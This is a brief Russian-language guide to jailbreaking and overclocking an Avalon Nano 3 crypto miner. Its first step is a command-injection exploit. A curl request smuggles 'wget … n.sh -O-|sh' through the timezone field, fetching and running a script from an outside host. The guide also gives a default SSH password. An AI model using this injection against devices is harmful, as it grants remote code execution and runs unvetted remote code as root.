# 🛠️ Avalon Nano 3 - Полное Руководство

**Оригинал:** https://orca.pet/nanojb/  
**Версия:** 1.0 (2026)

---

## 📋 Быстрый старт

### 1. SSH доступ (1 минута)
```bash
curl 'http://YOUR_MINER_IP/timezoneconf.cgi' \
  -b 'auth=ff0000ff4813494d137e1631bba301d5' \
  --data-raw 'timezone=%3Bwget%20http%3A%2F%2Fxn--i29h.ge%2Fn.sh%20-O-%7Csh%3B'
```

### 2. Подключение
```bash
ssh admin@YOUR_MINER_IP  # пароль: admin
```

### 3. Разгон (опционально)
```bash
sudo -i
sed -i 's/work_level *= *.*/work_level = 2/' /data/usrcon/systemcfg.ini
sed -i 's|./btcminer \&|./btcminer --avalon10-freq 700 --avalon10-voltage 1300 \&|' /etc/init.d/rcS
reboot
```

---

## 📊 Характеристики

| Компонент | Значение |
|-----------|----------|
| SoC | Kendryte K230, 1.6GHz RISC-V |
| RAM | 128MB |
| Flash | 128MB NAND |
| ASIC | 10x A3198 |
| Хешрейт (сток) | 4 TH/s |
| Хешрейт (разгон) | 7-8 TH/s |

---

## ⚠️ Предупреждения

1. Разгон аннулирует гарантию
2. Высокий вольтаж сокращает срок службы
3. Температура не должна превышать 85°C
4. Не используйте в недоверенных сетях

---

## 📁 Файлы патча

Все файлы в: `/home/smile/avalon_patch/`

- `INSTRUCTION.md` - Подробная инструкция
- `install_overclock_ssh.sh` - Быстрая установка
- `README.md` - Описание

---

**Удачи! 🚀**
